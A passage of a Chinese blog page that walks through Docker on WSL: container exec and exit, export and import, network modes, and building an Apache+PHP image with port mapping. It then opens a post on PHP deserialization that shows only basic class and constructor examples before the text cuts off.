<p>使用attach进入容器,在容器中用exit退出时,容器会停止运行</p>
<p>使用exec进入容器,在容器中用exit退出时,容器会继续运行</p>
</blockquote>
<p>由于在wsl中可以使用<code>docker stop</code>命令停止容器,因此只使用<code>exec</code>命令即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND   CREATED             STATUS         PORTS     NAMES</span><br><span class="line">49e5c3d8f7c6   ubuntu:20.04   <span class="string">&quot;bash&quot;</span>    About an hour ago   Up 9 minutes             lucid_ramanujan</span><br><span class="line">root@Executor:~# docker <span class="built_in">exec</span> -it 49 bash</span><br><span class="line">root@49e5c3d8f7c6:/# <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND   CREATED             STATUS         PORTS     NAMES</span><br><span class="line">49e5c3d8f7c6   ubuntu:20.04   <span class="string">&quot;bash&quot;</span>    About an hour ago   Up 9 minutes             lucid_ramanujan</span><br></pre></td></tr></table></figure>
<p>退出容器使用<code>exit</code>,或者<code>ctrl+d</code></p>
<h5 id="导出导入容器">导出/导入容器</h5>
<p>将容器导出成tar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export &lt;容器&gt; &gt; &lt;位置&gt;</span><br></pre></td></tr></table></figure>
<p>比如将<code>49e5c3d8f7c6</code>这个容器(已安装ssh)导出到当前目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# docker <span class="built_in">export</span> 49 &gt; ssh-ubuntu.tar</span><br><span class="line">root@Executor:/home/docker# <span class="built_in">ls</span></span><br><span class="line">ssh-ubuntu.tar</span><br></pre></td></tr></table></figure>
<p>将tar包导入成镜像(不能直接导入成容器)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import [OPTIONS] &lt;tar包&gt; &lt;镜像&gt;</span><br></pre></td></tr></table></figure>
<p>将tar包导入为指定名称的镜像</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/home/docker# <span class="built_in">ls</span></span><br><span class="line">ssh-ubuntu.tar</span><br><span class="line">root@Executor:/home/docker# docker import ssh-ubuntu.tar ssh/ubuntu</span><br><span class="line">sha256:725bf542d42fc0f7aad48f47ef2b81d1bcf7931bd1283a2b91ccbd3f8246e876</span><br><span class="line">root@Executor:/home/docker# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">ssh/ubuntu   latest    725bf542d42f   5 seconds ago   234MB</span><br><span class="line">ubuntu       20.04     20fffa419e3a   6 weeks ago     72.8MB</span><br></pre></td></tr></table></figure>
<p>后面使用该镜像只需要<code>docker run -it &lt;镜像&gt; bash</code></p>
<h2 id="docker网络">docker网络</h2>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/212772001">Docker
网络模式详解及容器间网络通信 - 知乎 (zhihu.com)</a></p>
<p><a
target="_blank" rel="noopener" href="https://www.cnblogs.com/zuxing/articles/8780661.html#:~:text=Docker：网络模式详解.%20Docker作为目前最火的轻量级容器技术，牛逼的功能，如Docker的镜像管理，不足的地方网络方面。.%20安装Docker时，它会自动创建三个网络，bridge（创建容器默认连接到此网络）、%20none,、host.%20host：容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。.%20Container：创建的容器不会创建自己的网卡，配置自己的IP，而是和一个指定的容器">Docker：网络模式详解
- Gringer - 博客园 (cnblogs.com)</a></p>
<h3 id="四个模式">四个模式</h3>
<h4 id="host">host</h4>
<p>docker容器与wsl共用ip地址,docker服务直接使用wsl的端口地址空间,外界可以通过ip:port方式访问docker容器</p>
<h4 id="none">none</h4>
<p>无网络链接</p>
<h4 id="bridge">bridge</h4>
<p>桥接模式,安装Docker时会为wsl创建一个叫做docker0的虚拟网桥</p>
<p>这个网桥只对桥接的docker容器还有wsl本身可见,作用是wsl和桥接容器之间的通信</p>
<p>两个接到同一网桥的容器或者容器和网桥之间均可以相互通信</p>
<p>对于容器来说,wsl上的网桥就相当于一个交换机</p>
<p>wsl:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# ifconfig</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet6 fe80::42:d9ff:fedd:7c32  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 02:42:d9:dd:7c:32  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 23965  bytes 1142407 (1.1 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 39791  bytes 118121373 (118.1 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>容器1:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@2c98c979b54a:/# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.4  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:04  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 147  bytes 206651 (206.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 120  bytes 8092 (8.0 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>容器2:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@7cf02bb435be:/var/www/html# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 6  bytes 516 (516.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>wsl的docker0网卡,两个容器的eth0网卡,其IP地址都是<code>172.17.0.X</code>(实际上从子网掩码看出该网段的IP地址可以是<code>172.17.X.X</code>)</p>
<blockquote>
<p>docker的桥接和虚拟机的桥接不同</p>
<p>虚拟机和主机桥接之后,虚拟机,主机,主机连接的路由器,都在同一网段</p>
<p>docker容器和docker主机的桥接,所有docker容器和docker主机的docker0网卡在同一网段,docker主机的另一张网卡eth0和路由器在同一网段</p>
<figure>
<img
src="https://images2018.cnblogs.com/blog/1259802/201804/1259802-20180410165500455-232801094.jpg"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>docker容器和docker0网桥相连使用了veth
pair技术,每个容器的eth0都与docker0上的一个veth*(一个数字)配对,两个虚拟网卡组成数据通道,从一个进去必然从另一出来</p>
<p>说是"桥接",实际上相当于docker主机进行了一个NAT变换</p>
<p>所有容器的数据通过自己的虚拟网卡eth0发往docker主机的虚拟
网卡docker0,然后docker主机用"外网"网卡eth0上网(这里外网是相对于docker0虚拟网桥而言的,当然相对于路由器来说eth0还是"内网")</p>
</blockquote>
<h4 id="container">container</h4>
<p>两个容器共享同一网络空间,包括ip地址和端口号</p>
<p>目前用不到,用到时再说</p>
<h3 id="docker网络相关命令">docker网络相关命令</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ...</span><br></pre></td></tr></table></figure>
<h4 id="查看网络模式">查看网络模式</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network list</span><br></pre></td></tr></table></figure>
<p>列出三个默认的网络模式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker network <span class="built_in">ls</span></span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">3ce19195196f   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">c1341214f1d0   host      host      <span class="built_in">local</span></span><br><span class="line">d4e52924ce6b   none      null      <span class="built_in">local</span></span><br></pre></td></tr></table></figure>
<p>目前只用到<code>docker network list</code>命令,其他需要以后再说</p>
<h2 id="配置apache2php环境">配置apache2+php环境</h2>
<p>由于官方的镜像不能满足要求,我需要修改官方镜像创建满足我们要求的镜像</p>
<h3 id="容器内基本配置">容器内基本配置</h3>
<p>首先要从官方的镜像改造一个满足我们要求的镜像</p>
<p>这需要经历一个<code>官方镜像-&gt;改造容器-&gt;导出新镜像</code>的过程</p>
<h4 id="拉取apachephp镜像">拉取apache+php镜像</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull php:7.0-apache</span><br></pre></td></tr></table></figure>
<h4 id="创建临时容器">创建临时容器</h4>
<blockquote>
<p>说他是"临时容器",是因为我们需要用这个基础镜像创建容器进行一些改造,然后生成我们需要的镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it php:7.0-apache bash</span><br></pre></td></tr></table></figure>
<h4 id="换docker容器的apt下载源">换docker容器的apt下载源</h4>
<h5 id="备份">备份</h5>
<p>备份原来的下载源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
<h5 id="更新">更新</h5>
<p>更新下载源,由于此时没有vi没有vim,只能用cat等shell命令完成</p>
<blockquote>
<p>换元之前先看一下容器的操作系统版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@06ca8ea43c1c:/var/www/html# cat /etc/issue</span><br><span class="line">Debian GNU/Linux 9 \n \l</span><br></pre></td></tr></table></figure>
<p>然后上网搜对应版本的国内源进行更换</p>
</blockquote>
<p>适用于<code>Debian GNU/LINUX 9</code>的阿里云源:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; /etc/apt/sources.list &lt;&lt; EOF</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian-security stretch/updates main</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian-security stretch/updates main</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib</span><br><span class="line">deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<h4 id="配置网站">配置网站</h4>
<p>在该容器的网站根目录<code>/var/www/html</code>下面,写一个<code>info.php</code>,打印php信息作为测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在系统根目录下写一个<code>/start.sh</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 restart   </span><br><span class="line">/usr/bin/tail -f /dev/null</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第一条作用是启动apache2服务器,第二条作用是,让执行这条命令的容器一直有前台进程在忙,防止docker容器自动停止</p>
</blockquote>
<h4
id="安装ssh等其他可有可无的服务...">安装ssh等其他可有可无的服务...</h4>
<h4 id="导出镜像">导出镜像</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit &lt;容器&gt; apache/ubuntu:latest</span><br></pre></td></tr></table></figure>
<blockquote>
<p>将该容器导出为一个叫"apache/ubuntu:latest"的容器</p>
</blockquote>
<h3 id="从新镜像创建新容器">从新镜像创建新容器</h3>
<p>现在使用<code>docker run</code>命令,从新<code>apache/ubuntu:latest</code>镜像上创建并启动新容器</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dit -p 10011:80 apache/ubuntu:latest /bin/bash -c <span class="string">&quot;/start.sh&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>-d后台运行</p>
<p>-it启动交互终端</p>
<p>-p 10011:80,wsl的10011端口映射到容器的80端口</p>
<p>apache/ubuntu:latest我们自定义的镜像名</p>
<p>/bin/bash -c "/start.sh"命令行参数,启动后立刻自动执行</p>
<p>没有指定网络模式默认为桥接模式</p>
<p>没有指定端口上的传输层服务类型默认为TCP服务</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker run -dit -p 10011:80 apache/ubuntu /bin/bash -c <span class="string">&quot;/start.sh&quot;</span></span><br><span class="line">edc1b61f6c7a20ce4d85989ffa4c5042dc13769161f4d89952604a8496b869d1</span><br><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                  CREATED         STATUS        PORTS                                     NAMES</span><br><span class="line">edc1b61f6c7a   apache/ubuntu   <span class="string">&quot;docker-php-entrypoi…&quot;</span>   2 seconds ago   Up 1 second   0.0.0.0:10011-&gt;80/tcp, :::10011-&gt;80/tcp   friendly_northcutt</span><br></pre></td></tr></table></figure>
<p>此时新容器就创建好了,可以看到PORTS栏目里面,wsl的10011端口已经映射给了docker的80端口,其上运行了一个tcp服务</p>
<h4 id="访问容器">访问容器</h4>
<p>怎么访问这个容器呢?</p>
<p>访问这个容器就是访问wsl的10011号端口,可以使用<code>ip:port</code>方式进行访问</p>
<p>在wsl上使用ifconfig看一下wsl的ip地址是多少</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# ifconfig</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet6 fe80::42:86ff:feaf:17dc  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 02:42:86:af:17:dc  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 45  bytes 26682 (26.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 50  bytes 5382 (5.3 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.31.174.19  netmask 255.255.240.0  broadcast 172.31.175.255</span><br><span class="line">        inet6 fe80::215:5dff:fe99:9ce8  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:15:5d:99:9c:e8  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 613  bytes 86373 (86.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 304  bytes 90966 (90.9 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>发现wsl在windows主机NAT后面的ip地址是<code>172.31.174.19</code></p>
<p>虽然wsl和windows主机之间的网络模式是NAT模式,与windows主机同路由器局域网内的其他设备是无法访问wsl的,</p>
<p>但是windows主机是可以访问wsl的,windows主机相对于wsl就是"外网环境",我们只需要在windows主机浏览器上访问<code>172.31.174.19:10011</code></p>
<p>或者windows主机上<code>curl 172.31.174.19:10011/info.php</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220724204301206.png"
alt="image-20220724204301206" />
<figcaption aria-hidden="true">image-20220724204301206</figcaption>
</figure>
<p>可以看见,windows主机是可以访问docker容器的apache2服务的</p>
<blockquote>
<p>站在windows主机的角度,怎样看出这是一个docker容器提供的apache2服务,而不是wsl提供的apache2服务呢?</p>
<p>从该phpinfo的回显结果可以隐约看出这是一个docker容器提供的服务</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220724204601250.png"
alt="image-20220724204601250" />
<figcaption aria-hidden="true">image-20220724204601250</figcaption>
</figure>
<p>首先这个System名,谁会起一个edc1b61f6c7a作为主机名啊?这个数是一个docker容器id</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:~# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                  CREATED          STATUS          PORTS                                     NAMES</span><br><span class="line">edc1b61f6c7a   apache/ubuntu   <span class="string">&quot;docker-php-entrypoi…&quot;</span>   12 minutes ago   Up 11 minutes   0.0.0.0:10011-&gt;80/tcp, :::10011-&gt;80/tcp   friendly_northcutt</span><br></pre></td></tr></table></figure>
<p>其次,后面的configuration-&gt;apache2handler中</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220724204736232.png"
alt="image-20220724204736232" />
<figcaption aria-hidden="true">image-20220724204736232</figcaption>
</figure>
<p>这里ip地址和端口号均与wsl不一样,如果是wsl直接提供apache2服务,这里应是<code>172.31.174.19:80</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/07/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">php反序列化漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-21 03:28:00 / Modified: 03:37:50" itemprop="dateCreated datePublished" datetime="2022-07-21T03:28:00+08:00">2022-07-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="php反序列化">php反序列化</h1>
<p>反序列化unserialize和序列化serialize是一对互逆的操作</p>
<p>对象经过序列化成为字符串</p>
<p>满足条件的字符串经过反序列化成为对象</p>
<p>需要了解一下php面向对象</p>
<h2 id="php面向对象基础">php面向对象基础</h2>
<h3 id="类">类</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 成员变量 */</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 成员函数 */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;<span class="comment">//setter方法</span></span><br><span class="line">     <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params"></span>)</span>&#123;<span class="comment">//getter方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;domain;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">     <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span>=<span class="keyword">new</span> <span class="title class_">Site</span>;<span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">setTitle</span>(<span class="string">&quot;the empire&quot;</span>);<span class="comment">//调用成员函数</span></span><br><span class="line"><span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">setDomain</span>(<span class="string">&quot;www.dustball.top&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">getDomain</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$mySite</span>-&gt;<span class="title function_ invoke__">getTitle</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="构造函数析构函数">构造函数&amp;析构函数</h3>
<p>在使用new关键字实例化对象的时候,会自动调用构造函数,如果不显式声明则默认有一个啥也不干的缺省构造函数</p>
<p>当对象生命期结束时,系统自动执行其析构函数.如果不显式声明则默认有一个啥也不干的缺省析构函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__construct</span> ([ <span class="keyword">mixed</span> <span class="variable">$args</span> [, $... ]] )</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__destruct</span> ( <span class="keyword">void</span> )</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/* 成员变量 */</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 成员函数 */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span 